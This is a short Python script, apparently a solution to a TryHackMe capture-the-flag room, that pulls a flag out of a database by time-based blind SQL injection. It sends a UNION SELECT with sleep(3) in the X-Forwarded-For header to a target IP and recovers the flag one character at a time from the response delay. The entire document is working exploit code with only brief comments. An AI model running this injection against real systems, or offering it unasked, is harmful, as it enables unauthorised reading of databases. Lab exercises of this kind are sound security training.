import requests
import time
import string

char_set = string.hexdigits + 'THM{FLAG:}' #flag is in the format THM{FLAGx:<hexadecimal>}

IP = input('Enter target IP: ')

flag = ''

for i in range(43): #flag has 43 characters
    for c in char_set:
        #flags are stored in the flag table and in the flag column of the database.
        headers = {
            'x-forwarded-for': f"*' union select 1,2,sleep(3) from flag where flag like '{flag}{c}%';"
        }

        start_time = time.time()
        res = requests.get(f'http://{IP}', headers=headers)
        end_time = time.time()
        response_time = end_time - start_time

        if response_time >= 3:
            flag+=c
            print(c.upper(), end='', flush=True)
            break